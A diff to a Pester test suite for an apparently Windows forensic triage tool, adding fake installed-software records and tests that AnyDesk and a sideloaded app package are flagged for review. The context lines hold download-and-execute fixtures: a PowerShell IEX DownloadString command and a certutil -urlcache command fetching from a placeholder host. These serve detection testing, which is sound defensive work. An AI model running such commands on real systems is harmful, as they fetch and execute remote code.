@@ -233,6 +233,12 @@ Describe 'Processes, pipes, BITS, PowerShell history and 4688' {
             [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 2; Command = 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")' },
             [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 3; Command = 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")' }
         )
+        $d.installed_software = @(
+            [pscustomobject]@{ Type = 'Desktop'; Scope = 'Machine'; DisplayName = 'AnyDesk'; DisplayVersion = '9.0.1'; Publisher = 'AnyDesk Software GmbH'; InstallDate = '2026-01-01'; InstallLocation = 'C:\Program Files (x86)\AnyDesk'; SignatureKind = $null },
+            [pscustomobject]@{ Type = 'Desktop'; Scope = 'Machine'; DisplayName = '7-Zip 24.08 (x64)'; DisplayVersion = '24.08'; Publisher = 'Igor Pavlov'; InstallDate = $null; InstallLocation = 'C:\Program Files\7-Zip\'; SignatureKind = $null },
+            [pscustomobject]@{ Type = 'Store'; Scope = 'User:CORP\jdoe'; DisplayName = 'Microsoft.WindowsCalculator'; DisplayVersion = '11.2405.2.0'; Publisher = 'Microsoft Corporation'; InstallDate = '2025-06-01'; InstallLocation = 'C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_x'; SignatureKind = 'Store' },
+            [pscustomobject]@{ Type = 'Store'; Scope = 'User:CORP\jdoe'; DisplayName = 'Contoso.Helper'; DisplayVersion = '1.0.0.0'; Publisher = 'Contoso'; InstallDate = '2026-01-01'; InstallLocation = 'C:\Program Files\WindowsApps\Contoso.Helper_x'; SignatureKind = 'Developer' }
+        )
         $evt = { param($id, $data) [pscustomobject]@{ TimeCreated = '2026-01-01T00:00:00Z'; LogName = 'Security'; EventId = $id; Data = [pscustomobject]$data } }
         $d.events_process_creation = @(
             (& $evt 4688 @{ CommandLine = 'certutil.exe -urlcache -f http://x/a a.exe'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe'; ParentProcessName = 'C:\Windows\System32\cmd.exe' }),
@@ -290,6 +296,24 @@ Describe 'Processes, pipes, BITS, PowerShell history and 4688' {
         $leads | Where-Object Title -eq 'Scheduled task created: \EvilTask' | Should -Not -BeNullOrEmpty
         $leads | Where-Object Title -like 'System audit policy changed*' | Should -Not -BeNullOrEmpty
         $leads | Where-Object Title -like 'Scheduled task updated*' | Should -BeNullOrEmpty
+    }
+    It 'shows installed applications with versions, desktop and Store' {
+        $html | Should -Match '<section id="apps">'
+        $html | Should -Match 'id="apps-table"'
+        $html | Should -Match 'AnyDesk'
+        $html | Should -Match '<td class="mono">9\.0\.1</td>'
+        $html | Should -Match 'Contoso\.Helper'
+    }
+    It 'raises remote access tools and sideloaded packages as review, not ordinary apps' {
+        ($leads | Where-Object Title -like 'Remote access tool installed: AnyDesk*').Severity | Should -Be 'review'
+        ($leads | Where-Object Title -like 'Sideloaded app package: Contoso.Helper*').Severity | Should -Be 'review'
+        $leads | Where-Object Title -like '*7-Zip*' | Should -BeNullOrEmpty
+        $leads | Where-Object Title -like '*WindowsCalculator*' | Should -BeNullOrEmpty
+    }
+    It 'adds collapse controls without hiding anything in the HTML itself' {
+        $html | Should -Match 'data-fold-all="collapse"'
+        $html | Should -Match 'function makeFold'
+        $html | Should -Not -Match 'class="fold-body"'
     }
     It 'diffs BITS jobs against a baseline' {
         $bp = New-FakeTriage -Path (Join-Path $root 'bits-base') -Data (@{ bits_jobs = @($d.bits_jobs[2]) })
